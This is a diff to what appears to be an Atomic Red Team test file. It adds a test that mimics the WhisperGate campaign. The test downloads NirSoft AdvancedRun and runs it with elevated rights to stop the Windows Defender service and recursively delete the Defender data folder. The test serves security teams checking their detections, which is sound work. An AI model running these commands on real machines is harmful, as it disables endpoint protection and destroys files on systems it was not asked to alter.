@@ -585,4 +585,31 @@ atomic_tests:
       New-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Feature' -name 'TamperData' -value 0
     cleanup_command: Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Feature' -name 'TamperData' -value 1
     name: powershell
-  
+- name: Disable Defender Using NirSoft AdvancedRun
+  description: |
+    Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html
+    This Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.
+    See https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3
+    Upon successful execution, AdvancedRun.exe will attempt to run and stop Defender, as well as attempt to delete the Defender folder on disk. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    AdvancedRun_Location:
+      description: Path of Advanced Run executable
+      type: Path
+      default: '$env:temp\AdvancedRun.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Advancedrun.exe must exist at #{AdvancedRun_Location}
+    prereq_command: |
+      if(Test-Path -Path #{AdvancedRun_Location}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -OutFile "$env:temp\advancedrun.zip"
+      Expand-Archive -path "$env:temp\advancedrun.zip" -destinationpath "$env:temp\" -Force
+  executor:
+    command: |
+      Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
+      Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "rmdir '$env:programdata\Microsoft\Windows Defender' -Recurse" /StartDirectory "" /RunAs 8 /Run} Catch{}
+    name: powershell
+    elevation_required: true
